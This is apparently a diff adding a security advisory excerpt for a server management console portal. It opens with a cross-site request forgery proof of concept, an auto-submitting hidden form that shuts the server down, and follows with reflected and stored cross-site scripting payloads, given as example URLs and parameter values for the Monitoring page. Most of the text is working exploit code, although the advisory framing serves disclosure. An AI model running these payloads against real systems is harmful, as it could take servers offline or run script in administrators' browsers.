@@ -1,0 +1,39 @@
+<html>
+        <form
+action='http://www.example/console/portal//Server/Shutdown/__ac0x3console-base0x2ServerManager!-1172254814|0'
+id=1>
+                <input type=hidden value='Shutdown' name="shutdown">
+                <input type=submit>
+        </form>
+</html>
+<script>
+        document.getElementById(1).submit();
+</script>
+
+1. Linked XSS vulnerability.
+
+Attacker can inject XSS in URL string.
+
+Example:
+
+http://www.example.com/console/portal/"><script>alert('DSecRG XSS')</script><!--
+
+
+2. Multiple Stored XSS vulnerabilities found in script
+
+http://www.example.com/console/portal/Server/Monitoring
+
+Vulnerable parameters: "name", "ip", "username", "description".
+
+Attacker can inject scripts into monitorings.
+
+Example [Monitoring - Create View]:
+
+name = <script>alert('DSecRG XSS')</script>
+description = </textarea><script>alert("DSecRG XSS")</script>
+
+or
+
+http://www.example.com/console/portal//Server/Monitoring/__ac0x3monitoring0x2monitoring!126896788|0/__pm0x3monitoring0x2monitoring!126896788|0_edit?action=saveA
+ddView&name="><script>alert("DSecRG XSS")</script>&description=</textarea><script>alert("DSecRG XSS")</script>
+
